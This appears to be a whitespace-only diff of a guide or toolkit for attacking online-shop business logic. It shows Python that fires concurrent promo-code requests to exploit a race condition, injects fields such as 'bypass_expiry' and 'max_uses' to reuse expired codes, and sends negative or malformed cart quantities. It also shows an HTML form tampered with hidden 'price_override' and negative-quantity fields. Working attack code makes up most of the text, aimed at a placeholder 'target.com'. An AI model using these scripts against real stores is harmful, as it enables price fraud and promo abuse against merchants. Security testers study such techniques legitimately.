@@ -61,12 +61,12 @@ async def apply_promo_concurrent(code, count=5):
                 json={"code": code, "session_id": "legitimate-session-001"}
             )
             tasks.append(task)
-        
+
         responses = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        approved = sum(1 for r in responses 
+
+        approved = sum(1 for r in responses
                       if not isinstance(r, Exception) and r.status_code == 200)
-        
+
         return {
             "code": code,
             "requests_sent": count,
@@ -164,34 +164,34 @@ from datetime import datetime, timedelta
 def test_expired_code_bypass(target_url, code, expiry_date):
     """Test if expiry validation is client-side only"""
     results = []
-    
+
     # Test 1: Modify client-side expiry check
     # (If expiry is only in JS, sending the code bypasses it)
     r1 = httpx.post(f"{target_url}/api/promo/apply",
                    json={"code": code, "bypass_expiry": True})
     results.append(("bypass_expiry_header", r1.status_code))
-    
+
     # Test 2: Send expiry in future even if code expired
     future = (datetime.utcnow() + timedelta(days=30)).isoformat()
     r2 = httpx.post(f"{target_url}/api/promo/apply",
                    json={"code": code, "expires_at": future})
     results.append(("fake_expiry", r2.status_code))
-    
+
     # Test 3: JSON body with no expiry field
     r3 = httpx.post(f"{target_url}/api/promo/apply",
                    json={"code": code})
     results.append(("no_expiry_field", r3.status_code))
-    
+
     # Test 4: Integer overflow on usage counter
     r4 = httpx.post(f"{target_url}/api/promo/apply",
                    json={"code": code, "max_uses": 999999})
     results.append(("overflow_uses", r4.status_code))
-    
+
     return results
 
 results = test_expired_code_bypass(
-    "https://target.com", 
-    "EXPIRED2025", 
+    "https://target.com",
+    "EXPIRED2025",
     "2025-12-31"
 )
 for method, code in results:
@@ -271,17 +271,17 @@ def test_quantity_manipulation():
         {"item_id": "SKU001", "quantity": [1, -1]},  # Array
         {"item_id": "SKU001", "quantity": {"raw": -1}},
     ]
-    
+
     for payload in test_cases:
         try:
             r = httpx.post(f"{TARGET}/api/cart/update",
                           json=payload, timeout=10)
-            
+
             # Check if negative quantity was accepted
             if r.status_code == 200:
                 data = r.json()
                 new_total = data.get('cart_total')
-                
+
                 # Check for unusual outcomes
                 if new_total and float(new_total) < 0:
                     print(f"⚠️  VULNERABLE: {payload} → total={new_total}")
@@ -305,11 +305,11 @@ test_quantity_manipulation()
   <!-- Original -->
   <input type="hidden" name="item_sku" value="SKU001">
   <input type="hidden" name="quantity" value="1">
-  
+
   <!-- Injected -->
   <input type="hidden" name="price_override" value="0.01">
   <input type="hidden" name="discount_code" value="SECRET2026">
-  
+
   <!-- Hidden quantity manipulation -->
   <input type="hidden" name="quantity" value="-1">
 </form>
